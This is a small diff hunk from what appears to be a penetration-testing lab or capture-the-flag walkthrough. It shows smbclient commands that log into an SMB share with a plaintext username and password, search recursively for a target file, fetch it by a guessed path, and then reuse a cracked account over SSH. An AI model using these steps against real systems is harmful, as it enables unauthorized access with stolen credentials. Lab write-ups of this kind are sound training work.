@@ -302,7 +302,8 @@ smbclient //192.168.10.101/Users -U martin%qwerty1234
 #We didn't get any file called webpent.txt so we verified again by this below command
 smbclient //192.168.10.101/Users -U martin%qwerty1234 -c 'recurse ON; dir' | grep -i 'webpent.txt'
 webpent.txt A 98 Tue Sep 10 08:17:56 2024 #We can see it's exist here but not showing the path
-
+#Though we didn't get any path, as our experience we can follow same user path...like this below:
+get Martin\My Documents\My Music\webpent.txt
 
 #Now as we know earlier we cracked SSH so we login with ssh
 ssh martin@192.168.10.101
